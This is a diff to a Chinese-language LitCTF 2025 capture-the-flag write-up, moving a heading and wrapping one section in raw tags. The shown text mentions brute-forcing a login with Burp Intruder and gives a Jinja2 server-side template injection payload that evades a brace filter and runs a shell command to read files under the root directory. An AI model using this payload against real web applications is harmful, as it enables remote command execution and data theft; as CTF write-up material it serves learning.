@@ -8,8 +8,6 @@ typora-root-url: ./..
 
 # LitCTF 2025 WriteUp
 
-# 信息
-
 战队名：不_知道
 
 **排名：2**
@@ -24,9 +22,12 @@ username 和 password 错误时输出不同。burp 起一个 intruder 爆。
 
 ## 星愿信箱
 
-过滤了双大括号那用{%%}。别的正常 SSTI 就行。
+{% raw %}
+过滤了{{}}那用{%%}。别的正常 SSTI 就行。
 
 `{%print(g.pop.__globals__.__builtins__.__import__('so'[::-1]).popen('nl ``/*``').read())%}`
+
+{% endraw %}
 
 ## 多重宇宙日记
 
